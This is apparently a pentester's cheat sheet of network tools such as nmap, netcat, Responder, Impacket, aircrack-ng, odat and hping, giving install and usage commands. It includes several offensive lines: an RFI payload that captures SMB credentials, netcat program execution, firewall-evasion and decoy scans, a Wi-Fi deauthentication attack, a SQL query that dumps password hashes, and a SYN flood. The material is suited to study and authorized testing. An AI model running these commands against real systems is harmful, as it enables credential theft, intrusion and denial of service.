# Tools and Utilities

Here are some tools and utilities commonly used for practices related to networks:

## <mark style="color:green;">OpenVPN</mark>

* VPN system that implements both client and server applications, including a command-line utility

### <mark style="color:yellow;">Commands</mark>

* Installation

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install openvpn
```
{% endcode %}

***

* Connect to a VPN

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo openvpn $ovpnfile
```
{% endcode %}

## <mark style="color:green;">SmbClient</mark>

* Tool for accessing a server using the [SMB](protocols/smb.md) protocol

### <mark style="color:yellow;">**Commands**</mark>

* Installation

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install smbclient
```
{% endcode %}

***

* Connect and interact with an SMB server

{% code overflow="wrap" lineNumbers="true" %}
```bash
smbclient -I $IP    #Connect to server
smbclient -L $IP -N #List elements on the server without providing a password 
smbclient //$IP/$ShareName       #Acces to a shared instance
smbclient \\\\$IP\\$ShareName    #Alternative
smbclient //$IP/$ShareName $username #Connect indicating a username
smbclient //$IP/$ShareName -c "$comand" #Execute a command
smb: \>                 #Text based interface
smb: \> get $filename   #Download a file
smb: \> put $filename   #Upload a file
smb: \> exit            #Close connection
```
{% endcode %}

## <mark style="color:green;">Responder</mark>

* Help in the passive obtention of credentials by mounting an [SMB](protocols/smb.md) server on the web that intercepts internal communication from this protocol

### <mark style="color:yellow;">Commands</mark>

* Install

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install responder
```
{% endcode %}

***

* Change the configuration file

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo nano /usr/share/responder/Responder.conf #Installed here by default
```
{% endcode %}

***

* Initialize tool

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo responder -I $networkinterface
```
{% endcode %}

{% hint style="warning" %}
If we get an error in any port, we have to update the _Responder.conf_ file and set to _off_ the value of the service related to that port
{% endhint %}

***

* Abuse an [RFI](../web-exploitation/web-vulnerabilities/remote-file-inclusion-wip.md) on a web page to intercept SMB credentials

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>http://$url/$query?$value=//$myip/somefile
</strong></code></pre>

{% hint style="info" %}
If the process works, we will see the server catch the credentials
{% endhint %}

## <mark style="color:green;">Tcpdump</mark>

* Command-line packet analyzer tool used to capture and inspect network traffic sent via the [TPC ](protocols/tcp.md)protocol in real-time

### <mark style="color:yellow;">**Commands**</mark>

* Install

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install tcpdump
```
{% endcode %}

***

* Set up a listener

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo tcpdump -i $networkInterface port $port
```
{% endcode %}

## <mark style="color:green;">Netcat</mark>

* _Unix_ utility that reads and writes data across network connections
* Can act as a server or as a listener
* By default makes a TCP connection but can be used with TCP or UDP protocol

### <mark style="color:yellow;">**Commands**</mark>

* Install

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install netcat-traditional
```
{% endcode %}

***

* Start netcat

{% code overflow="wrap" lineNumbers="true" %}
```bash
nc $hostname $port
nc -n $IP $port        #Use only numeric IP no DNS
nc -v $hostname $port  #Verbose Output
```
{% endcode %}

***

* Start in listen mode

{% code overflow="wrap" lineNumbers="true" %}
```bash
nc -l -p $port
nc -nvlp $port     #The best way to make it
```
{% endcode %}

***

* Make a file transmission

{% code overflow="wrap" lineNumbers="true" %}
```bash
nc -nvlp $port > $incomingfile  #From listening side
nc -n -v -p $port < $file       #From sender side

#From the listening side
$incomingfile -h    #Check if the transmission was correct 
```
{% endcode %}

***

* Execute a program on the server

{% code overflow="wrap" lineNumbers="true" %}
```bash
nc -l -p $port -e $program
```
{% endcode %}

***

* Interact with network protocols

{% code overflow="wrap" lineNumbers="true" %}
```bash
#Example
sudo nc $ip 80 #We connect to HTTP service

#We send a petition
GET / HTTP/1.1
host: netcat      #After finishing, hit enter to send
```
{% endcode %}

{% hint style="warning" %}
To make a line jump is necessary to press _Shift+Enter_
{% endhint %}

## <mark style="color:green;">Nmap</mark>

* An open-source tool for network exploration and security auditing that works as a network mapper

### <mark style="color:yellow;">**Scan types**</mark>

* _SYN_ scans are also known as _Half-open_ or _Stealth._ They are stealthier than _Connect_ scans
* The difference between _Connect_ and _SYN_ scans is that _Connect_ performs a full three-way handshake with the target. Instead of that, _SYN_ scans send back an _RST_ packet after receiving a _SYN/ACK_
* The UDP scans are slower than TCP scans
* In UDP scans, if the port is open, it will send no response and will be marked as _open|filtered_. If there's a response will be marked as _open_. If it's closed, the target responds with an ICMP packet containing a message that the port is unreachable
* _NULL_, _FIN_, _Xmas_, and _ACK_ scans are stealthier than _SYN_ or UDP scans, usually used for firewall evasion
* _NULL_ scans send a TCP request with no flags, the target host responds with _RST_ if the port is closed
* _FIN_ scans send a TCP request with the _FIN_ flag, used to gracefully close an active connection. The target host responds with _RST_ if the port is closed
* _Xmas_ scans send a malformed TCP packet, and the target host responds with _RST_ if the port is closed
* Microsoft Windows may respond to a _NULL_, _FIN,_ or _Xmas_ scan with an _RST_ for every port

### <mark style="color:yellow;">**NSE**</mark>

* The [_Nmap_ Scripting Engine](https://nmap.org/nsedoc/) is a library of scripts written in Lua that can be used for scanning vulnerabilities and automating exploits for them.
* Every script has a category related to its use scenario
* By default, _Nmap_ stores scripts in _/usr/share/nmap/scripts/script.db_

### <mark style="color:yellow;">**Port State**</mark>

* **Open:** This indicates that the connection to the scanned port has been established
* **Closed:** TCP protocol indicates that the packet we received back contains an RST flag. Can be used to determine if a target is alive or not
* **Filtered:** Cannot correctly identify whether the scanned port is open or closed because it got no response or an error code from the target
* **Unfiltered:** Only occurs during the TCP-ACK scan and means that the port is accessible, but it cannot be determined if it's open or closed
* **Open|filtered:** Didn't get a response, so a firewall or packet filter could be protecting the port
* **Closed|filtered:** Only occurs in the IP ID idle scans, indicating it was impossible to determine if a port is closed or filtered by a firewall

### <mark style="color:yellow;">**Commands**</mark>

* Install

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install nmap
```
{% endcode %}

***

* Basic scans

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap $scantype $options $target #General syntax
nmap $ip  #Scan an IP
nmap $domain  #Scan an IP using the domain
nmap $ip1 $ip2  # Scan some IPs
nmap x.x.x.$range1-$range2 #Scan a range of IPs
nmap x.x.x.x/$mask  #Scan using CIDR notation
nmap -iL $inputfile #Scan using the IPs from a list
nmap -iR $number #Scan random hosts
nmap --exclude $ip  #Scan excluding an specific IP
nmap --excludefile $file #Scan excluding the IPs from a list
```
{% endcode %}

***

* TCP scan

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -sT $target  #TCP Connect scan, default if run without sudo
nmap -sS $target  #TCP SYN scan, default if run with sudo
nmap -sN $target  #TCP Null scan, good for firewall evasion
nmap -sF $target  #TCP FIN scan, good for firewall evasion
nmap -sX $target  #TCP Xmas scan, good for firewall evasion
nmap -sA $target  #TCP ACK scan, good for firewall evasion
```
{% endcode %}

***

* UDP scan

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -sU $target
```
{% endcode %}

***

* Select which port scan

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -p $port $target
nmap -p $port-port $target   #Select a range of ports
nmap -p- $target             #Scan all ports
nmap --top-ports $numberofports $target   #Specify the most common ports
nmap -F $target   #Scan the 100 most common ports
```
{% endcode %}

***

* Scan without checking if the target is alive

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn $target #Don't ping a port to confirm if it is alive
nmap --disable-arp-ping $target #Don't ping a port via ARP
```
{% endcode %}

***

* Only make host discovery

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>sudo nmap -sn $target
</strong>sudo nmap -sn -PR $target #Only ARP scan
<strong>sudo nmap -sn -PE $target #Make ICMP echo request
</strong>sudo nmap -sn -PP $target #Make ICMP timestamp request
sudo nmap -sn -PM $target #Make address mask request
sudo nmap -sn -PS $ports $target #Use TCP SYN ping
sudo nmap -sn -PA $ports $target #Use TCP ACK ping
sudo nmap -sn -PU $ports $target #Use UDP ping
</code></pre>

{% hint style="info" %}
If _ICMP_ scans return MAC addresses, it means the hosts are in the same subnet
{% endhint %}

***

* DNS resolution

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo nmap -n $target #Don't use reverse DNS
sudo nmap -R $target #Use reverse DNS even with offline hosts
```
{% endcode %}

***

* Detect OS

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -O $target
```
{% endcode %}

***

* Get the versions of the services running

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -sV $target
```
{% endcode %}

***

* List hosts to be scanned without scanning them

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -sL $targets
```
{% endcode %}

***

* Increase the verbosity level of the output

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -v $target
nmap -vv $target      #Level 2 verbosity, MOST recommended
nmap -vvv $target     #Level 3 verbosity
```
{% endcode %}

***

* Specified Output Format

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -oN $target  #Normal output
nmap -oX $target  #XML Format
nmap -oG $target  #Grepable Format
nmap -oA $target  #All 3 Formats at once
```
{% endcode %}

***

* Increase the speed the scan runs

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -T $timinglevel $target
nmap --min-rate $number $target #Specify the numbers of sent packets per second
```
{% endcode %}

{% hint style="warning" %}
This mode is louder than normal
{% endhint %}

***

* Use scripts from the NSE library

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>nmap -sC $target    #Script scan
</strong><strong>nmap --script=$scriptfile  $target
</strong>nmap --script=$category  $target  #Active all scripts in the category
nmap -p $port --script=$script --script-args $script.$arg='$argvalue' #Pass arguments to a script
sudo nmap --script-updatedb    #Update script database
grep $keyword /usr/share/nmap/scripts/script.db    #Search scripts using grep
ls -l /usr/share/nmap/scripts/*$keyword*           #Search scripts using ls
find / -type f -name ftp* 2>/dev/null | grep scripts #Search scripts using find
#Common scripts
nmap $IP -p445 --script=smb-enum-users.nse    #Enumerate SMB users
nmap $IP -p445 --script=smb-enum-groups.nse   #Enumerate SMB groups
nmap $IP -p445 --script smb-enum-shares.nse   #Enumerate SMB shares
nmap $IP -p445 --script smb-enum-processes.nse #Enumerate SMB processes
<strong>nmap $IP --script=http-enum                    #Enumerate HTTP services
</strong>nmap -sVC -p21 $IP --script=trace              #Enumerate FTP services
nmap $IP -p25 --script=smtp-commands #List available commands on an SMTP server
<strong>nmap $IP -p25 --script=smtp-open-relay #identify an SMTP server as an open relay
</strong></code></pre>

***

* Fragment packets sent in a scan

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap $target -f   
nmap $target -mpu $number   #Specify packet's length   
```
{% endcode %}

{% hint style="warning" %}
The length of packets must be a multiple of 8
{% endhint %}

***

* Specify the delay between packets sent

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap $target --scan-delay $number ms
```
{% endcode %}

***

* Generate an invalid checksum for packets

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap $target --badsum   
```
{% endcode %}

***

* Append an arbitrary length of random data to the end of packets

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap $target --data-length  $number  
```
{% endcode %}

***

* Specify the number of retries if a packet gets dropped or blocked

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap $target --max-retries $number 
```
{% endcode %}

***

* For firewall evasion

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap $target -Pn -n -S $myIP -e $interface #Use different Source IP
nmap $target -Pn -n --disable-arp-ping -D RND:$number $target #Use Decoys to vary between random IPs
nmap $target -Pn -n --disable-arp-ping --source-port 53 #Use DNS service as proxy
```
{% endcode %}

## <mark style="color:green;">ARP-Scan</mark>

* A tool for making host discovery via the [ARP](protocols/arp.md) protocol
* Only devices in the same subnet can be discovered

### <mark style="color:yellow;">**Commands**</mark>

* Install

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install arp-scan
```
{% endcode %}

***

* Scan options

{% code overflow="wrap" lineNumbers="true" %}
```bash
arp-scan $tagetRange
arp-scan -l                           #Scan local network
arp-scan $tagetRange -I $netInterface #Specify which network interface to use
```
{% endcode %}

## <mark style="color:green;">Masscan</mark>

* A tool for making port scanning, which is optimized for speed, making it particularly useful for large-scale scans

### <mark style="color:yellow;">**Commands**</mark>

* Install

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install masscan
```
{% endcode %}

***

* Scan options

{% code overflow="wrap" lineNumbers="true" %}
```bash
masscan $targetRange -p $ports
masscan $targetRange ‐‐top-ports $number #Specify number of most used ports
```
{% endcode %}

## <mark style="color:green;">Docker</mark>

* An open-source platform that allows building, packaging, and running applications in isolated environments called containers

### <mark style="color:yellow;">Commands</mark>

* Install

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install docker-ce docker-ce-cli containerd.io
sudo apt install docker-compose-plugin #Install docker-compose
```
{% endcode %}

***

* Manage containers and images

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash">sudo docker rm $containerID #Delete a container
sudo docker build . #Build an image from a Dockerfile in the actual folder
<strong>sudo docker image ls #List all installed images
</strong>sudo docker image rm $imageID #Delete a installed image
sudo docker container ls        #List all running containers
sudo docker run $containerID    #Run container using ID
sudo docker run $containerName  #Run container using Name
sudo docker run $containerName --rm #Run container but deleted when done
sudo docker run $containerName -p $hostPort:$containerPort #Specificate run ports
sudo docker container stop $containerID #Stop a running container
sudo docker compose up -d #Use .yml file to run various containers in the background
</code></pre>

## <mark style="color:green;">onesixtyone</mark>

* An SNMP scanner which is used to brute force the community string names

### <mark style="color:yellow;">Commands</mark>

* Install&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install onesixtyone
```
{% endcode %}

* Usage

{% code overflow="wrap" lineNumbers="true" %}
```bash
onesixtyone -c $dictionary $IP
```
{% endcode %}

## <mark style="color:green;">xfreerdp</mark>

* An open-source implementation of the [RDP](protocols/rdp.md) protocol

### <mark style="color:yellow;">Commands</mark>

* Install&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install freerdp2-x11
```
{% endcode %}

* Usage

{% code overflow="wrap" lineNumbers="true" %}
```bash
xfreerdp /v:$host #Conenct to a remote machine
xfreerdp /v:$host /u:$username #Connect as a user without providing a password
xfreerdp /v:$host /u:$username /p:$password #Connect as a user providing password
```
{% endcode %}

## <mark style="color:green;">Rsync</mark>

* Command-line tool for fast, flexible, and efficient file and directory synchronization and transfer between two locations

### <mark style="color:yellow;">Commands</mark>

* Install&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install rsync
```
{% endcode %}

* Usage

{% code overflow="wrap" lineNumbers="true" %}
```bash
rsync $IP #Connect to the remote service
rsync --list-only $IP #Just list the contents
rsync 10.129.197.128:: #When the target is using a daemon instead of SSH
rsync --list-only $IP::$foldername #List content fo a folder
rsync $IP::$foldername/$filename $localroute #Transfer a shared file
```
{% endcode %}

## <mark style="color:green;">Impacket</mark>

* A collection of Python classes for working with network protocols

### <mark style="color:yellow;">Commands</mark>

* Installation

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install python3-impacket
```
{% endcode %}

***

* Use of scripts

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash">sudo impacket-$scriptname $options
#Common scripts
sudo impacket-mssqlclient  $hostname/$user@$ip #Connect to MS SQL server
<strong>sudo impacket-mssqlclient  $hostname/$user@$ip -windows-auth #Use Windows authentication to connect to MS SQL server
</strong>sudo impacket-psexec $username@$IP #Connect to the network service of a host
sudo impacket-samrdump $IP #Bruteforce SMB user RDIs
sudo impacket-wmiexec $username:"$password"@$IP "$hostname" #Chech WMI protocol 
</code></pre>

## <mark style="color:green;">Scapy</mark>

* Powerful interactive packet manipulation library written in Python, used to forge or decode packets of a wide number of protocols, send, capture them, match requests and replies, and much more

### <mark style="color:yellow;">Commands</mark>

* Install

{% code overflow="wrap" lineNumbers="true" %}
```bash
pip install scapy
```
{% endcode %}

***

* Usage

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>sudo scapy #Enter interactive mode
</strong><strong>>>> send(IP(dst="$IP")/ICMP()/"$Payload") #Send a ICMP package
</strong>>>> ls() #List all available formats and protocols
<strong>>>> ls($Protocol) #List all options and fields of a protocol or packet format
</strong>>>> explore() #Navigate Scapy layers and protocols
>>> explore($Protocol) #Navigate a specific protocol or packet format
</code></pre>

## <mark style="color:green;">Tshark</mark>

* A packet capture tool used to capture ICMP packets. Comes by default in the Wireshark tool packet

### <mark style="color:yellow;">Commands</mark>

* Install

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install wireshark
```
{% endcode %}

***

* Usage

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo tshark host $IP
```
{% endcode %}

## <mark style="color:green;">Aircrack-ng</mark>

* Wireless security toolset used for monitoring, attacking, testing, and cracking Wi-Fi networks

### <mark style="color:yellow;">Commands</mark>

* Install

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install aircrack-ng
```
{% endcode %}

***

* Usage

{% code overflow="wrap" lineNumbers="true" %}
```bash
airmon-ng start $NIC $channel    #Start monitoring
airodump-ng $NIC                 #Sniff wireless packets
aireplay-ng -0 0 -a $MAC $NIC    #Do de-authentication attack
```
{% endcode %}

## <mark style="color:green;">rpcclient</mark>

* Central tool to realize operational and work-sharing structures in networks and client-server architectures, useful for the enumeration of the SMB protocol

### <mark style="color:yellow;">Commands</mark>

* Install

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install rpcclient
```
{% endcode %}

***

* Usage

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash">rpcclient -U "$username" $IP # Conect to a host
rpcclient -U "" $IP          # Connect anonymously
<strong>rpcclient $> srvinfo	     # Get server information.
</strong>rpcclient $> enumdomains     # Enumerate all deployed domains
rpcclient $> querydominfo    # Get domain, server, and user information
rpcclient $> netshareenumall # Enumerate all available shares
rpcclient $> netsharegetinfo $share #Provide information about a share
rpcclient $> enumdomusers    # Enumerate all domain users
rpcclient $> queryuser $userID # Provide information about a user
rpcclient $> querygroup $groupID # Provide information about a user
</code></pre>

***

## <mark style="color:green;">smbmap</mark>

* Security tool used for enumerating and interacting with SMB shares on a network

### <mark style="color:yellow;">Commands</mark>

* Install

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install smbmap
```
{% endcode %}

***

* Usage

{% code overflow="wrap" lineNumbers="true" %}
```bash
smbmap -H $IP
```
{% endcode %}

## <mark style="color:green;">CrackMapExec</mark>

* Powerful post-exploitation tool used for network reconnaissance, credential validation, and lateral movement in Windows Active Directory (AD) environments

### <mark style="color:yellow;">Commands</mark>

* Install

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install crackmapexec
```
{% endcode %}

***

* Usage

{% code overflow="wrap" lineNumbers="true" %}
```bash
crackmapexec smb $IP --shares -u '$username' -p '$password' #Enumerate
crackmapexec smb $IP --shares -u '' -p '' #Enumerate anonymously
```
{% endcode %}



## <mark style="color:green;">smtp-user-enum</mark>

* A tool for making user enumeration for the [SMTP](protocols/smtp.md) protocol

### <mark style="color:yellow;">Commands</mark>

* Install

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install smtp-user-enum
```
{% endcode %}

***

* Usage

{% code overflow="wrap" lineNumbers="true" %}
```bash
smtp-user-enum -M $smtpCommand -U $usersFile -t $IP

#Example
smtp-user-enum -M VRFY -U $wordlist -t $IP -w 15 -v
```
{% endcode %}

## <mark style="color:green;">snmpwalk</mark>

* A tool for getting information about the community string for an SNMP protocol

### <mark style="color:yellow;">Commands</mark>

* Install

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install snmpwalk
```
{% endcode %}

***

* Usage

{% code overflow="wrap" lineNumbers="true" %}
```bash
snmpwalk -v2c -c public $IP
```
{% endcode %}

## <mark style="color:green;">snmp-check</mark>

* Utility  for scanning resources via the SNMP protocol

### <mark style="color:yellow;">Commands</mark>

* Install

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install snmp-check
```
{% endcode %}

***

* Usage

{% code overflow="wrap" lineNumbers="true" %}
```bash
snmp-check $IP
```
{% endcode %}

## <mark style="color:green;">odat</mark>

* Oracle Database Attacking Tool, an open-source penetration testing tool that tests the security of [_Oracle_](https://www.oracle.com/co/) databases remotely

### <mark style="color:yellow;">Commands</mark>

* Install the tool and required components using the following script

{% code title="Oracle_Tools.sh" overflow="wrap" lineNumbers="true" %}
```bash
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=/home/kali/Downloads/odat/instantclient_21_12:$PATH
sudo apt install python3-cx-oracle -y
sudo apt-get install python3-scapy -y
sudo apt install python3-colorlog python3-termcolor python3-passlib python3-libnmap -y
sudo apt-get install build-essential libgmp-dev -y
sudo apt install python3-pycryptodome -y
sed -i '9s/.*/from Cryptodome.Cipher import AES/' CVE_2012_3137.py
```
{% endcode %}

{% hint style="info" %}
The first time running odat there will be some errors, but it's normal and won't appear later
{% endhint %}

***

* Usage

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash">./odat.py -h #Get help many, use to confirm installation was successful
./odat.py all -s $IP #Scan target using all modules
./sqlplus $User/$Password@$IP/$SIDfound #Log in as a user
./sqlplus $User/$Password@$IP/$SIDfound as sysdba #Log as System Database Admin

#Once inside the database
<strong>SQL> select table_name from all_tables; #Get table names
</strong>SQL> select * from user_role_privs; #Check the privileges of the user
SQL> select name, password from sys.user$; #Get passwords from users
</code></pre>

## <mark style="color:green;">vnstat</mark>

* Lightweight command-line network traffic monitoring that tracks bandwidth usage per network interface using data from the kernel

### <mark style="color:yellow;">Commands</mark>

* Install

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install vnstat
```
{% endcode %}

***

* Usage

{% code overflow="wrap" lineNumbers="true" %}
```bash
vnstat -l -i $interface
```
{% endcode %}

## <mark style="color:green;">hping</mark>

* A powerful command-line network tool used primarily for packet crafting and analysis, which allows sending custom TCP/IP packets and observing the responses

### <mark style="color:yellow;">Commands</mark>

* Install

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install hping
```
{% endcode %}

***

* Usage

{% code overflow="wrap" lineNumbers="true" %}
```bash
hping3 -S -p 80 $Domain #Ping using TCP instead of ICMP
hping3 --flood -S -p 80 $Domain #Make a DoS test with SYN packets
```
{% endcode %}
